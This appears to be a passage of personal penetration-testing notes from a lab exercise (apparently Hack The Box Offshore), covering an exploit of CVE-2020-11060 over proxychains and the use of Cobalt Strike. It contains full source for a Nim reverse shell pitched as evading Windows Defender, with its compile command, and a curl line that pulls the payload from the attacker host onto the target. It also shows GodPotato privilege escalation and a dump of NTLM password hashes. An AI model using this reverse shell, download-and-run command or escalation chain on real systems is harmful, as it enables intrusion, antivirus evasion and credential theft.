 └─╼ # proxychains python3 CVE-2020-11060.py --url 'http://172.16.2.12//sound/mavEnVji.php' --command 'http_x64.exe'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
```
![[Pasted image 20240121004041.png]]
ran `execute-assembly /usr/share/peass/winpeas/winPEASx64.exe` and it about cooked the entire beacon.

im probably done for the night but im probably gonna try tomorrow to cobalt strike beacon -> pass session to meterpreter shell -> winpeas -> privesc -> flag probably


ran a `whoami /priv` and identified three enabled privileges.
```powershell
[01/26 16:51:09] beacon> run whoami /priv
[01/26 16:51:09] [*] Tasked beacon to run: whoami /priv
[01/26 16:51:09] [+] host called home, sent: 30 bytes
[01/26 16:51:09] [+] received output:


PRIVILEGES INFORMATION

----------------------



Privilege Name                Description                               State   

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
tried utilizing `spoolsystem inject` with a `.cna` script that i found but that didnt work
![[Pasted image 20240126170512.png]]
found this script that looked like it would work considering it prefers being a `network` user which we are
- `https://github.com/itm4n/FullPowers`

uploaded and ran the `FullPowers.exe` and it looks like it wanted to give me a `SYSTEM` shell but couldn't because i am in a cobalt strike session
![[Pasted image 20240126170637.png]]
going to session pass to a `meterpreter` and run it again to see if able to get `SYSTEM`



# Getting an actual shell

utilized this youtube video to get a `reverse shell` that actually bypassed defender
https://www.youtube.com/watch?v=BX-vFcRV664

github:
https://github.com/Sn1r/Nim-Reverse-Shell

the steps are listed below:
- make sure to have `mingw-w64` installed as well `nim` 
	- `sudo apt install mingw-w64` & `sudo apt install nim`
- utilized the `nim reverse shell` below  and saved into file named `rev_shell.nim`

```bash
#[ 
   Created by Sn1r
   https://github.com/Sn1r/
 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = "10.10.14.39"
  v2 = "5555"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  v.connect(v1, Port(parseInt(v2)))

  while true:
    v.send(os.getCurrentDir() & "> ")
    let c = v.recvLine()
    if c == "exit":
      v.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        v.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      v.send(r)

except:
  raise
finally:
  v.close
```
utilized this command to make it a fast reverse shell that bypasses defender, this utilizes nim and turns it into a `.exe` reverse shell
`nim c -d:mingw --app:gui --opt:speed -o sniff.exe rev_shell.nim` 


utilized this command to put `sniff.exe` onto `mgmt01`
```powershell
proxychains python3 CVE-2020-11060.py --url 'http://172.16.2.12//sound/mavEnVji.php' --command 'curl -O http://10.10.14.39:8000/sniff.exe'
```
![[Pasted image 20240126205856.png]]
found `GOD POTATO` godpotato.exe which abuses the `SEIMPERSONATEPRIVILEGE` on `WINDOWS SERVER 2019` as well as bypassses defender because its newish

- https://github.com/BeichenDream/GodPotato/releases

utilized `run reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s` to identify which `.NET` version is running which is v4

![[Pasted image 20240126210100.png]]
uploaded `GOD POTATO` as `gp4.exe` into `C:\WINDOWS\TASKS` on `MGMT01` as well as moved `sniff.exe` into the same directory.

started a `netcat` listener
```powershell
┌──(root💀gobots)-[26Jan2024 19:42:24]-[~/SUT/offshore/MGMT01]                                                                                                                                              
└─# nc -lvnp 5555                                                                                                                                                                                           
listening on [any] 5555 ...                                       
```
utilized `run gp4.exe -cmd sniff.exe` for god potato to execute my reverse shell.
![[Pasted image 20240126210343.png]]
it executed and I caught my reverse shell.
![[Pasted image 20240126210414.png]]
navigated to `C:\Users\Administrator\Desktop` for the flag
# INSERT FLAG NAME HERE 2ND ONE ON MGMT01
`OFFSHORE{l0ng_liv3_Th3_t@ter!}`

![[Pasted image 20240126210456.png]]
was able to get a beacon in the shell i had, took two attempts
```powershell
[01/26 22:14:40] beacon> hashdump
[01/26 22:14:40] [*] Tasked beacon to dump hashes
[01/26 22:14:40] [+] host called home, sent: 83262 bytes
[01/26 22:14:42] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:971bc1ac6d2344c4b42107976e0972dc:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f134707b7798ad1bbf37f49a6a422a38:::
```
![[Pasted image 20240126221604.png]]